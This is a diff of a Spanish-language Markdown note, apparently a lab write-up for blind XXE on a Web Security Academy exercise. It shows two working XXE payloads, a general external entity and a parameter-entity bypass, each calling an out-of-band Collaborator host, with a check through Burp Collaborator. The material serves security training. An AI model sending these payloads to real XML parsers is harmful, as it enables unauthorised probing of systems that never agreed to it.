@@ -20,23 +20,22 @@ tags:
 - **Sub-problema:** si el parser **bloquea entidades generales externas** (`&`), subo a **entidad de parámetro** (`%`) — el primer bypass de la escalera.
 
 ## Cómo explotarlo
+
+> 🟡 <mark>Resaltado</mark> = lo que reemplazás vos (target/collab/exploit) + el **objetivo** del ataque (archivo/URL/entidad).
+
 **Escalón 1 — entidad general externa:**
-```http
-POST /product/stock HTTP/1.1
-Host: TARGET.web-security-academy.net
+<pre><code>POST /product/stock HTTP/1.1
+Host: <mark>TARGET.web-security-academy.net</mark>
 Content-Type: application/xml
 
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://COLLAB.oastify.com"> ]>
-<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
-```
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "http://<mark>COLLAB.oastify.com</mark>"&gt; ]&gt;
+&lt;stockCheck&gt;&lt;productId&gt;&amp;xxe;&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;</code></pre>
 
 **Escalón 2 — si el 1 no dispara** (bloquea entidades **generales**), entidad de parámetro (`%`):
-```http
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://COLLAB.oastify.com"> %xxe; ]>
-<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
-```
+<pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [ &lt;!ENTITY % xxe SYSTEM "http://<mark>COLLAB.oastify.com</mark>"&gt; %xxe; ]&gt;
+&lt;stockCheck&gt;&lt;productId&gt;1&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;</code></pre>
 
 ## Verificación
 Burp → pestaña **Collaborator** → **Poll now** → interacciones **DNS + HTTP** = XXE ciego confirmado.
